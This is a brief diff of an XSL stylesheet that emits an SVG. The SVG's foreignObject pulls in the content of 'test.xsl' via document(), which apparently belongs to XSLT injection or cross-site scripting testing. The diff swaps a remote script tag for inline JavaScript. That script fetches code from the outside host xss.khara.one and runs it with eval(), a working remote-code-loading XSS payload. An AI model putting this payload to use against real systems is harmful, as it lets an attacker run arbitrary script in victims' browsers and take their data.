@@ -14,7 +14,9 @@
 			document() <xsl:copy-of  select="document('test.xsl')"/>
 		    </div>
 		</foreignObject>
-    <script src="//xss.khara.one/a"></script>
+    <script>
+	    function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://xss.khara.one/a");a.send();
+    </script>
 	</svg>
  </xsl:template>
 </xsl:stylesheet>
